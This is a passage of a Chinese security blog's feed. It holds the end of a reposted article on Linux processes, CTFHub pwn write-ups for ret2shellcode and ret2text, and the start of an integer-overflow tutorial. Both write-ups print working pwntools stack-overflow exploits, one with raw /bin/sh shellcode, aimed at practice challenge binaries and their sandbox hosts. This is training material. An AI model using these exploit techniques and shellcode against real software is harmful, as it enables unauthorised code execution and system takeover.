STAT：显示了进程当前的状态，如S（休眠）、R（运行）、Z（僵死）、&lt;（高优先级）、N（低优先级）、s（父进程）、+（前台进程）。对处于僵死状态的进程应予以手动终止。</p><p>START：启动该进程的时间 TIME：该进程占用CPU时间 COMMAND：启动该进程的命令的名称</p><p><strong>总结：ps aux 是以简单列表的形式显示出进程信息。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文转载于：&lt;a href=&quot;https://cloud.tencent.com/developer/article/1711858&quot;&gt;LINUX查看进程的4种方法(小结)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;进程是在 CPU 及内存中运行的程序代码，而每个进程可以创建一个或多个进程（父</summary>
      
    
    
    
    <category term="转载" scheme="https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
    <category term="系统进程" scheme="https://www.rgzzplus.com/tags/%E7%B3%BB%E7%BB%9F%E8%BF%9B%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>ret2shellcode</title>
    <link href="https://www.rgzzplus.com/2022/09/05/ret2shellcode/"/>
    <id>https://www.rgzzplus.com/2022/09/05/ret2shellcode/</id>
    <published>2022-09-05T11:54:06.000Z</published>
    <updated>2022-09-05T11:56:29.086Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x1"><a class="markdownIt-Anchor" href="#0x1"></a> 0x1</h1><blockquote><p><a href="https://www.ctfhub.com/#/skilltree">题目地址</a></p></blockquote><p>拿到题目，首先看看文件类型，以及保护机制。<br><img src="/2022/09/05/ret2shellcode/image-20220903235214002.png" alt="image-20220903235214002"></p><p>我们发现它缺少执行权限，加上权限后执行，是简单的输入输出，不过这里似乎给到我们了一个地址。</p><h1 id="0x2"><a class="markdownIt-Anchor" href="#0x2"></a> 0x2</h1><p>接下来，把程序拖入 ida，反汇编看看：<br><img src="/2022/09/05/ret2shellcode/image-20220904000019546.png" alt="image-20220904000019546"></p><p>我们发现这个程序中并没有关于 flag 的相关信息，所以我们推测 flag 存放在服务器上。</p><p>还发现程序通过 read() 把输入存入buf[]，也没有保护机制保护栈，这就给了我们栈溢出的机会。<br>还记得我们前面提到的那个输出的地址吗，从反汇编代码可以看出，它就是 buf 的地址。</p><h1 id="0x3"><a class="markdownIt-Anchor" href="#0x3"></a> 0x3</h1><p>这样我们就有了溢出思路，通过输入字符串一直覆盖掉 rbp，制造栈溢出。<br>通过题目名称 ret2shellcode，也能知道最后一定要获得 shell 的。但我并未在程序中发现关于获得 sh 的代码，那就只能自己写了。</p><h1 id="0x4"><a class="markdownIt-Anchor" href="#0x4"></a> 0x4</h1><p>梳理一下我们<strong>需要获得的信息</strong>：</p><ul><li>buf[] 的地址</li><li>buf[] 与 rbp 的距离</li><li>shellcode</li></ul><p>（ 1）buf[] 的地址，就在输出中，我们要想办法把它提取出来。<br><img src="/2022/09/05/ret2shellcode/image-20220904002822097.png" alt="image-20220904002822097"></p><blockquote><p><code>recvuntil</code>( <em>delims</em> , <em>drop=False</em> , <em>timeout=default</em> ) → 字节[<a href="https://github.com/Gallopsled/pwntools/blob/493a3e3d92/pwnlib/tubes/tube.py#L273-L361">资源]</a></p><p>接收数据，直到遇到delims之一。</p><p>如果在<code>timeout</code>几秒内没有满足请求，所有数据都会被缓冲并返回一个空字符串 ( <code>''</code>)。</p><ul><li><pre><code>  参数：</code></pre><strong>delims</strong> ( <a href="https://docs.python.org/3.8/library/stdtypes.html#bytes"><em>bytes</em></a> <em>,</em> <a href="https://docs.python.org/3.8/library/stdtypes.html#tuple"><em>tuple</em></a> ) — 分隔符的字节串，或分隔符字节串的列表。<br><strong>drop</strong> ( <a href="https://docs.python.org/3.8/library/functions.html#bool"><em>bool</em></a> ) – 删除结尾。如果<code>True</code>它从返回值的末尾移除。</li><li><pre><code>  Raises：  **exceptions.EOFError** — 连接在请求得到满足之前关闭         </code></pre></li><li><pre><code>  返回值：  包含从套接字接收到的字节的字符串，或者`''`如果在等待时发生超时。 </code></pre></li></ul><p>摘自：<a href="https://docs.pwntools.com/en/stable/tubes.html">pwntools</a></p></blockquote><p>（ 2）距离</p><p>方法一：看汇编代码，buf[] 与 rbp 的距离：0x10 + 8 = 24<sub>10</sub><br><img src="/2022/09/05/ret2shellcode/image-20220904002551439.png" alt="image-20220904002551439"></p><p>方法二： peda 调试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda pwn</span><br><span class="line">pattern create 200     //制造200个填充字符（多少字符都行），先把他复制下来</span><br><span class="line">r                      //运行程序</span><br><span class="line"></span><br><span class="line">pattern offset 地址     //ret 地址，确定偏移</span><br></pre></td></tr></table></figure><p><img src="/2022/09/05/ret2shellcode/image-20220904002120603.png" alt="image-20220904002120603"></p><p><img src="/2022/09/05/ret2shellcode/image-20220904002141581.png" alt="image-20220904002141581"></p><p><img src="/2022/09/05/ret2shellcode/image-20220904002212274.png" alt="image-20220904002212274"></p><p><img src="/2022/09/05/ret2shellcode/image-20220904002358262.png" alt="image-20220904002358262"></p><p>( 3) shellcode</p><ul><li>可以自己编写，<a href="https://www.rgzzplus.com/2022/08/05/Linux-shellcode%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/">shellcode 开发入门</a></li><li>使用 pwntools 生成，<a href="http://shellcraft.sh">shellcraft.sh</a>()</li></ul><h1 id="0x5"><a class="markdownIt-Anchor" href="#0x5"></a> 0x5</h1><p><strong>exp：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>* </span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># p = connect(&#x27;challenge-47138fa4ef483fb7.sandbox.ctfhub.com&#x27;,33570)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;[&#x27;</span>)</span><br><span class="line">buf_addr = p.recvuntil(<span class="string">b&#x27;]&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(buf_addr)</span><br><span class="line">shellcode = <span class="string">b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">24</span> + p64(<span class="built_in">int</span>(buf_addr,<span class="number">16</span>)+<span class="number">32</span>)+shellcode</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input someting :&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后远程连接获取 flag：ls 发现有一个flag文件，cat flag 即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x1&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x1&quot;&gt;&lt;/a&gt; 0x1&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://www.ctfhub.com/#/skilltree&quot;&gt;题目地址&lt;/a&gt;&lt;/p</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="ret2shellcode" scheme="https://www.rgzzplus.com/tags/ret2shellcode/"/>
    
  </entry>
  
  <entry>
    <title>ret2text</title>
    <link href="https://www.rgzzplus.com/2022/09/05/ret2text/"/>
    <id>https://www.rgzzplus.com/2022/09/05/ret2text/</id>
    <published>2022-09-05T11:33:01.000Z</published>
    <updated>2022-09-05T11:55:59.717Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x0"><a class="markdownIt-Anchor" href="#0x0"></a> 0x0</h1><p>配置好基本环境</p><ul><li>安装gdb：通过apt-get install build-essential安装基本的编译环境，都会带入gdb</li><li>安装peda：这是个python程序，对gdb功能进行了增强，例如带入了 checksec 程序，用来检查文件信息</li></ul><h1 id="0x1"><a class="markdownIt-Anchor" href="#0x1"></a> 0x1</h1><blockquote><p><a href="https://www.ctfhub.com/#/skilltree">ret2text题目地址</a></p></blockquote><blockquote><p>参考：<a href="https://www.jianshu.com/p/4231b886ded5">ret2text（一道题入门）</a></p><p>​<a href="https://writeup.ctfhub.com/Skill/Pwn/%E6%A0%88%E6%BA%A2%E5%87%BA/ofBtUNidwfzzuXMBNBr4SF.html">ret2text</a></p></blockquote><p>拿到一道题的第一步我们先去检查他的保护机制： <code>checksec pwn</code><br><img src="/2022/09/05/ret2text/../../document/Markdown/ret2text/image-20220903165751567.png" alt="image-20220903165751567"></p><p>所有安全措施 CANARY/FORTIFY/NX/PIE 都关闭了，说明该题不需要复杂的绕过操作</p><p><code>./pwn</code> 运行，显示缺少权限。<code>ll pwn</code> 后发现缺少执行权限，加权 <code>chmod +x pwn</code><br><img src="/2022/09/05/ret2text/../../document/Markdown/ret2text/image-20220903170125790.png" alt="image-20220903170125790"></p><p>执行，我发现，这里有一个输入，这时我们就要注意，有可能是一个栈溢出利用。<br><img src="/2022/09/05/ret2text/../../document/Markdown/ret2text/image-20220903170250704.png" alt="image-20220903170250704"></p><h1 id="0x2"><a class="markdownIt-Anchor" href="#0x2"></a> 0x2</h1><p>我们把程序拉进 ida 反汇编一下：<br><img src="/2022/09/05/ret2text/../../document/Markdown/ret2text/image-20220903170605745.png" alt="image-20220903170605745"></p><p>按 F5 反汇编，程序很简单，就是输入输出，这里用了 gets() 函数来获取输入，栈溢出确凿无疑了。<br><img src="/2022/09/05/ret2text/../../document/Markdown/ret2text/image-20220903170641096.png" alt="image-20220903170641096"></p><blockquote><p>gets()函数用于从缓冲区中读取字符串，其原型如下：<br>char *gets(char *string);</p><p>gets()函数从流中读取字符串，直到出现换行符或读到文件尾为止，最后加上NULL作为字符串结束。所读取的字符串暂存在给定的参数string中。</p><p>【返回值】若成功则返回string的指针，否则返回NULL。</p><p>注意：由于gets()不检查字符串string的大小，必须遇到换行符或文件结尾才会结束输入，因此容易造成缓存溢出的安全性问题，导致程序崩溃，可以使用fgets()代替。<br>————————————————<br>博主「改个名字真不容易�」<br>原文链接：<a href="https://blog.csdn.net/weixin_44010117/article/details/107866101">https://blog.csdn.net/weixin_44010117/article/details/107866101</a></p></blockquote><p>但是并没看到跟 flag 相关的信息。继续看，发现还有个 <code>secure</code> 函数。<br><img src="/2022/09/05/ret2text/../../document/Markdown/ret2text/image-20220903171624728.png" alt="image-20220903171624728"></p><p>函数中调用了 <code>system('/bin/sh')</code>，所以猜测获取 flag 是通过执行 <code>system</code> 获得 shell，然后再执行命令。</p><h1 id="0x3"><a class="markdownIt-Anchor" href="#0x3"></a> 0x3</h1><p><strong>思路梳理：</strong></p><p>从 IDA 中可以看出，pwn 程序只有这两个用户函数，其他的都是库函数。因此答案就在这两个函数中。停下来想想我们已知的内容：</p><ul><li>main 函数调用了 gets()，且未限制长度，存在栈溢出，是解题的入口</li><li>secure 函数调用了 system(‘bin/sh’)，是解题的出口</li></ul><blockquote><p>**栈溢出的原理：**溢出溢出，字面上就是往容器里加的水超过了水的容积，简单讲，栈溢出就是向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，造成溢出。</p><p><strong>发生栈溢出的条件</strong>：程序必须向栈上写入数据。写入的数据大小没有被良好地控制。</p><p><strong>利用方式</strong>：覆盖程序的返回地址为攻击者所控制的地址，比如该地址为执行shellcode的地址shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，可以让攻击者获得shell，利用pwntools可自动生成，等用到再说。</p><p><strong>可能造成栈溢出的函数有：gets,scanf,vscanf,sprintf,strcpy,strcat，bcopy</strong></p></blockquote><p>根据栈溢出原理，我们可以通过输入超长字符串来溢出 v4[112] 数组，进而覆盖掉 RBP。</p><p>这时，我们只要用 system(‘bin/sh’) 的入口地址，来覆盖 RBP，就能获得 shell。</p><h1 id="0x4"><a class="markdownIt-Anchor" href="#0x4"></a> 0x4</h1><p>梳理一下我们<strong>需要获取的信息</strong>：</p><ul><li>system(‘bin/sh’) 的入口地址</li><li>v4[0] 与 RBP 间的距离</li></ul><p>system(‘bin/sh’) 入口地址直接在 ida 中就能找到：0x4007B8</p><p><img src="/2022/09/05/ret2text/../../document/Markdown/ret2text/image-20220903172832504.png" alt="image-20220903172832504"></p><p>至于 v4[0] 与 RBP 间的距离 我们可以通过调试计算获得：</p><p>v4[0]  &lt;----&gt;  [rbp-0x70]，由于是64位操作系统，所以 距离：0x70 + 8 = 120<sub>10</sub><br><img src="/2022/09/05/ret2text/../../document/Markdown/ret2text/image-20220903173129005.png" alt="image-20220903173129005"></p><p>关于距离计算，其实 gdb 插件 peda 就能够自动获取这个长度：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda pwn</span><br><span class="line">pattern create 200     //制造200个填充字符（多少字符都行），先把他复制下来</span><br><span class="line">r                      //运行程序</span><br><span class="line"></span><br><span class="line">pattern offset 地址     //ret 地址，确定偏移</span><br></pre></td></tr></table></figure><p><img src="/2022/09/05/ret2text/../../document/Markdown/ret2text/image-20220903175659627.png" alt="image-20220903175659627"></p><p><img src="/2022/09/05/ret2text/../../document/Markdown/ret2text/image-20220903175730446.png" alt="image-20220903175730446"></p><p><img src="/2022/09/05/ret2text/../../document/Markdown/ret2text/image-20220903175829667.png" alt="image-20220903175829667"></p><h1 id="0x5"><a class="markdownIt-Anchor" href="#0x5"></a> 0x5</h1><p><strong>编写 exp</strong></p><p>先写一个本地的exp 方便调试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*  <span class="comment"># 导入 pwntools库 </span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)<span class="comment"># 执行 pwn</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">120</span> + p64(<span class="number">0x4007B8</span>)<span class="comment"># p32()将其转换为字节流，64应用p64()</span></span><br><span class="line">p.sendline(payload)<span class="comment"># 发送 payload</span></span><br><span class="line">p.interactive()<span class="comment"># 进行交互，即运行shell</span></span><br></pre></td></tr></table></figure><p><img src="/2022/09/05/ret2text/../../document/Markdown/ret2text/image-20220903182737742.png" alt="image-20220903182737742"></p><p>再来写远程的 exp</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">p = connect(&#x27;challenge-4a6f183db92b776b.sandbox.ctfhub.com&#x27;,26016)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*120 + p64(0x4007B8)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><img src="/2022/09/05/ret2text/../../document/Markdown/ret2text/image-20220903165012377.png" alt="image-20220903165012377" style="zoom:80%;"><p>成功获得 flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x0&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x0&quot;&gt;&lt;/a&gt; 0x0&lt;/h1&gt;
&lt;p&gt;配置好基本环境&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;安装gdb：通过apt-get install build-essential安装基本的编译环境</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="ret2text" scheme="https://www.rgzzplus.com/tags/ret2text/"/>
    
  </entry>
  
  <entry>
    <title>整数安全</title>
    <link href="https://www.rgzzplus.com/2022/08/27/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/"/>
    <id>https://www.rgzzplus.com/2022/08/27/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/</id>
    <published>2022-08-27T04:48:59.000Z</published>
    <updated>2022-08-27T04:49:22.367Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="1-什么是整数溢出"><a class="markdownIt-Anchor" href="#1-什么是整数溢出"></a> 1. 什么是整数溢出</h2><h3 id="11-简介"><a class="markdownIt-Anchor" href="#11-简介"></a> 1.1 简介</h3><p>在 C 语言基础的章节中，我们介绍了 C 语言整数的基础知识，下面我们详细介绍整数的安全问题。</p><p>由于整数在内存里面保存在一个固定长度的空间内，它能存储的最大值和最小值是固定的，如果我们尝试去存储一个数，而这个数又大于这个固定的最大值时，就会导致整数溢出。（x86-32 的数据模型是 ILP32，即整数（Int）、长整数（Long）和指针（Pointer）都是 32 位。）</p><h3 id="12-整数溢出的危害"><a class="markdownIt-Anchor" href="#12-整数溢出的危害"></a> 1.2 整数溢出的危害</h3><p>如果一个整数用来计算一些敏感数值，如缓冲区大小或数值索引，就会产生潜在的危险。通常情况下，整数溢出并没有改写额外的内存，不会直接导致任意代码执行，但是它会导致栈溢出和堆溢出，而后两者都会导致任意代码执行。由于整数溢出出现之后，很难被立即察觉，比较难用一个有效的方法去判断是否出现或者可能出现整数溢出。</p><h2 id="2-整数溢出"><a class="markdownIt-Anchor" href="#2-整数溢出"></a> 2. 整数溢出</h2><p>关于整数的异常情况主要有三种：</p><ul><li>溢出<ul><li>只有有符号数才会发生溢出。有符号数最高位表示符号，在两正或两负相加时，有可能改变符号位的值，产生溢出</li><li>溢出标志 <code>OF</code> 可检测有符号数的溢出</li></ul></li><li>回绕<ul><li>无符号数 <code>0-1</code> 时会变成最大的数，如 1 字节的无符号数会变为 <code>255</code>，而 <code>255+1</code> 会变成最小数 <code>0</code>。</li><li>进位标志 <code>CF</code> 可检测无符号数的回绕</li></ul></li><li>截断<ul><li>将一个较大宽度的数存入一个宽度小的操作数中，高位发生截断</li></ul></li></ul><h3 id="21-有符号整数溢出"><a class="markdownIt-Anchor" href="#21-有符号整数溢出"></a> 2.1 有符号整数溢出</h3><ul><li>上溢出</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i;</span><br><span class="line">i = INT_MAX;  <span class="comment">// 2 147 483 647</span></span><br><span class="line">i++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;i = %d\n&quot;</span>, i);  <span class="comment">// i = -2 147 483 648</span></span><br></pre></td></tr></table></figure><ul><li>下溢出</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i = INT_MIN;  <span class="comment">// -2 147 483 648</span></span><br><span class="line">i--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;i = %d\n&quot;</span>, i);  <span class="comment">// i = 2 147 483 647</span></span><br></pre></td></tr></table></figure><h3 id="22-无符号数回绕"><a class="markdownIt-Anchor" href="#22-无符号数回绕"></a> 2.2 无符号数回绕</h3><p>涉及无符号数的计算永远不会溢出，因为不能用结果为无符号整数表示的结果值被该类型可以表示的最大值加 1 之和取模减（reduced modulo）。因为回绕，一个无符号整数表达式永远无法求出小于零的值。</p><p>使用下图直观地理解回绕，在轮上按顺时针方向将值递增产生的值紧挨着它：</p><p><img src="/2022/08/27/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/1.5.1_unsigned_integer.png" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ui;</span><br><span class="line">ui = UINT_MAX;  <span class="comment">// 在 x86-32 上为 4 294 967 295</span></span><br><span class="line">ui++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ui = %u\n&quot;</span>, ui);  <span class="comment">// ui = 0</span></span><br><span class="line">ui = <span class="number">0</span>;</span><br><span class="line">ui--;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ui = %u\n&quot;</span>, ui);  <span class="comment">// 在 x86-32 上，ui = 4 294 967 295</span></span><br></pre></td></tr></table></figure><h3 id="23-截断"><a class="markdownIt-Anchor" href="#23-截断"></a> 2.3 截断</h3><ul><li>加法截断：</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff + 0x00000001</span><br><span class="line">= 0x0000000100000000 (long long)</span><br><span class="line">= 0x00000000 (long)</span><br></pre></td></tr></table></figure><ul><li>乘法截断：</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x00123456 * 0x00654321</span><br><span class="line">= 0x000007336BF94116 (long long)</span><br><span class="line">= 0x6BF94116 (long)</span><br></pre></td></tr></table></figure><h3 id="24-整型提升和宽度溢出"><a class="markdownIt-Anchor" href="#24-整型提升和宽度溢出"></a> 2.4 整型提升和宽度溢出</h3><p>整型提升是指当计算表达式中包含了不同宽度的操作数时，较小宽度的操作数会被提升到和较大操作数一样的宽度，然后再进行计算。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> l;  </span><br><span class="line">    <span class="type">short</span> s;</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line"></span><br><span class="line">    l = <span class="number">0xabcddcba</span>;</span><br><span class="line">    s = l;</span><br><span class="line">    c = l;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;宽度溢出\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;l = 0x%x (%d bits)\n&quot;</span>, l, <span class="keyword">sizeof</span>(l) * <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;s = 0x%x (%d bits)\n&quot;</span>, s, <span class="keyword">sizeof</span>(s) * <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c = 0x%x (%d bits)\n&quot;</span>, c, <span class="keyword">sizeof</span>(c) * <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;整型提升\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;s + c = 0x%x (%d bits)\n&quot;</span>, s+c, <span class="keyword">sizeof</span>(s+c) * <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">./a.out</span></span><br><span class="line">宽度溢出</span><br><span class="line">l = 0xabcddcba (32 bits)</span><br><span class="line">s = 0xffffdcba (16 bits)</span><br><span class="line">c = 0xffffffba (8 bits)</span><br><span class="line">整型提升</span><br><span class="line">s + c = 0xffffdc74 (32 bits)</span><br></pre></td></tr></table></figure><p>使用 gdb 查看反汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000001169 &lt;+0&gt;:endbr64 </span><br><span class="line">   0x000000000000116d &lt;+4&gt;:push   rbp</span><br><span class="line">   0x000000000000116e &lt;+5&gt;:mov    rbp,rsp</span><br><span class="line">   0x0000000000001171 &lt;+8&gt;:sub    rsp,0x10</span><br><span class="line">   0x0000000000001175 &lt;+12&gt;:mov    DWORD PTR [rbp-0x4],0xabcddcba</span><br><span class="line">   0x000000000000117c &lt;+19&gt;:mov    eax,DWORD PTR [rbp-0x4]</span><br><span class="line">   0x000000000000117f &lt;+22&gt;:mov    WORD PTR [rbp-0x6],ax</span><br><span class="line">   0x0000000000001183 &lt;+26&gt;:mov    eax,DWORD PTR [rbp-0x4]</span><br><span class="line">   0x0000000000001186 &lt;+29&gt;:mov    BYTE PTR [rbp-0x7],al</span><br><span class="line">   0x0000000000001189 &lt;+32&gt;:lea    rdi,[rip+0xe74]        # 0x2004</span><br><span class="line">   0x0000000000001190 &lt;+39&gt;:call   0x1060 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000001195 &lt;+44&gt;:mov    eax,DWORD PTR [rbp-0x4]</span><br><span class="line">   0x0000000000001198 &lt;+47&gt;:mov    edx,0x20</span><br><span class="line">   0x000000000000119d &lt;+52&gt;:mov    esi,eax</span><br><span class="line">   0x000000000000119f &lt;+54&gt;:lea    rdi,[rip+0xe6b]        # 0x2011</span><br><span class="line">   0x00000000000011a6 &lt;+61&gt;:mov    eax,0x0</span><br><span class="line">   0x00000000000011ab &lt;+66&gt;:call   0x1070 &lt;printf@plt&gt;</span><br><span class="line">   0x00000000000011b0 &lt;+71&gt;:movsx  eax,WORD PTR [rbp-0x6]</span><br><span class="line">   0x00000000000011b4 &lt;+75&gt;:mov    edx,0x10</span><br><span class="line">   0x00000000000011b9 &lt;+80&gt;:mov    esi,eax</span><br><span class="line">   0x00000000000011bb &lt;+82&gt;:lea    rdi,[rip+0xe63]        # 0x2025</span><br><span class="line">   0x00000000000011c2 &lt;+89&gt;:mov    eax,0x0</span><br><span class="line">   0x00000000000011c7 &lt;+94&gt;:call   0x1070 &lt;printf@plt&gt;</span><br><span class="line">   0x00000000000011cc &lt;+99&gt;:movsx  eax,BYTE PTR [rbp-0x7]</span><br><span class="line">   0x00000000000011d0 &lt;+103&gt;:mov    edx,0x8</span><br><span class="line">   0x00000000000011d5 &lt;+108&gt;:mov    esi,eax</span><br><span class="line">   0x00000000000011d7 &lt;+110&gt;:lea    rdi,[rip+0xe5b]        # 0x2039</span><br><span class="line">   0x00000000000011de &lt;+117&gt;:mov    eax,0x0</span><br><span class="line">   0x00000000000011e3 &lt;+122&gt;:call   0x1070 &lt;printf@plt&gt;</span><br><span class="line">   0x00000000000011e8 &lt;+127&gt;:lea    rdi,[rip+0xe5e]        # 0x204d</span><br><span class="line">   0x00000000000011ef &lt;+134&gt;:call   0x1060 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000000011f4 &lt;+139&gt;:movsx  edx,WORD PTR [rbp-0x6]</span><br><span class="line">   0x00000000000011f8 &lt;+143&gt;:movsx  eax,BYTE PTR [rbp-0x7]</span><br><span class="line">   0x00000000000011fc &lt;+147&gt;:add    eax,edx</span><br><span class="line">   0x00000000000011fe &lt;+149&gt;:mov    edx,0x20</span><br><span class="line">   0x0000000000001203 &lt;+154&gt;:mov    esi,eax</span><br><span class="line">   0x0000000000001205 &lt;+156&gt;:lea    rdi,[rip+0xe4e]        # 0x205a</span><br><span class="line">   0x000000000000120c &lt;+163&gt;:mov    eax,0x0</span><br><span class="line">   0x0000000000001211 &lt;+168&gt;:call   0x1070 